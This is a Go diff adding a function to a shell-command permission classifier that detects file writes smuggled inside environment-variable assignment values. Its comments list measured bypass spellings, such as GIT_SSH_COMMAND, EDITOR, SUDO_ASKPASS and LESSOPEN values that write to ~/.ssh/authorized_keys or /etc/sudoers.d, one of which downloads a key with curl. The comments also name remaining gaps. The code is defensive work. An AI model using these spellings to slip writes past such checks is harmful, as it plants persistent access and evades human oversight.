@@ -259,6 +259,93 @@ func segmentWriteTargets(program string, args []string) []string {
 	return out
 }
 
+// wordWriteTargets is the write dimension's reading of a command written INTO
+// ONE WORD, and it is the exact counterpart of what classifyAssignmentPrefix and
+// classifyWordAsCommand do for the deletion dimension (ADR-0020).
+//
+// # The gap it closes
+//
+// segmentWriteTargets above reads the segment's PROGRAM WORD and its argv
+// SUFFIXES. Neither reading can see a command that is a single word, and the
+// most ordinary way to write one is POSIX assignment syntax: lexShellLite WALKS
+// PAST an assignment prefix (assignmentPrefixLen) to reach the program word, so
+// the VALUE was in no reading the write dimension had. Measured, all reaching
+// Allow under BOTH `fs.write: ["**"]` and an fs.write narrowed to the project
+// tree, while the unprefixed spelling of the same write is a Prompt:
+//
+//	GIT_SSH_COMMAND='tee ~/.ssh/authorized_keys' git fetch
+//	EDITOR='dd of=~/.ssh/authorized_keys' crontab -e
+//	env GIT_SSH_COMMAND='curl -o ~/.ssh/authorized_keys http://h/k' git fetch
+//	SUDO_ASKPASS='tee /etc/sudoers.d/zz' sudo -A id
+//
+// The third spelling is why this reads EVERY token rather than only the
+// assignment prefix: with a runner in front, the assignment is an ordinary argv
+// word and assignmentPrefixLen is 0. That is the same reason classifyTrailingArgv
+// runs classifyWordAsCommand over every argv word instead of only over the
+// prefix classifyAssignmentPrefix already covers.
+//
+// # The criterion is the value, not a list of variable names
+//
+// No name is consulted, on either side: a made-up variable in front of a made-up
+// program (`ZQ_NOBODY_READS_THIS='tee ~/.ssh/authorized_keys' zq-nobody-runs-this`)
+// is read exactly like GIT_SSH_COMMAND in front of git. The bypasscorpus rows
+// carrying `zq-` names are what fail if this becomes a table.
+//
+// # Scoped to targets that LEAVE THE WORKING TREE, for the reason the suffix
+// # walk is
+//
+// A word only MIGHT be a command — `git commit -m "cp a b"` is a message, not a
+// copy — which is the same uncertainty that caps classifyWordAsCommand at
+// DestructionOpaque. So a word-derived target is taken only when its spelling
+// leaves the working tree (leavesWorkingTree), the range where the reading can
+// change an answer at all. Without that scope, `MAKEFLAGS='-j 8 -O out.log' make`
+// and `ZZ='cp src.txt dst.txt' make` become refusals under a project-scoped
+// profile; with it, the ordinary-command sample measured 0 new prompts.
+//
+// The boundary this leaves is the same one segmentWriteTargets records for its
+// suffix walk: under a profile whose fs.write is EMPTY, a relative target inside
+// an assignment value is Allow where the unprefixed spelling is a refusal. Every
+// measured member of the family this exists for names an absolute or home path.
+//
+// # What it does not read
+//
+// One level. A value that is itself a wrapper carrying a payload
+// (`EDITOR='sh -c "echo k > ~/.ssh/authorized_keys"' crontab -e`) is not
+// descended into here — that shape is already a Prompt from the deletion
+// dimension's opaque tier, which is where an unread payload belongs. A value
+// naming a PATH rather than a command (`BASH_ENV=./payload.sh`) is the file
+// boundary ADR-0020 records and stops at.
+func wordWriteTargets(cmd string) []string {
+	tokens, ok := lexShellLiteTokens(cmd, false)
+	if !ok {
+		return nil
+	}
+	var out []string
+	for _, tok := range tokens {
+		for _, reading := range commandReadingsOfWord(tok) {
+			// A LEADING PIPE is not POSIX syntax — execpolicy.ParseCommandList
+			// refuses it as "operator without executable segment" — so where one
+			// appears at the head of a value it is the "run this as a filter"
+			// convention (less's LESSOPEN, mailcap), which is precisely the case
+			// where the value IS handed to a shell. Without the trim,
+			// `LESSOPEN='|tee ~/.ssh/authorized_keys %s' less f` lexes to the
+			// program word `|tee`, which is in no table, and stays Allow while
+			// its unpiped spelling is a Prompt. The rule reads the VALUE's
+			// spelling and no variable name, same as everything else here.
+			program, args, lexed := lexShellLite(strings.TrimPrefix(reading, "|"))
+			if !lexed {
+				continue
+			}
+			for _, t := range segmentWriteTargets(program, args) {
+				if leavesWorkingTree(t) {
+					out = append(out, t)
+				}
+			}
+		}
+	}
+	return out
+}
+
 // leavesWorkingTree reports whether a path's SPELLING names somewhere other than
 // a location under the directory the command runs in: an absolute path, a home
 // reference, an unresolved expansion (which could be either, so it counts), a
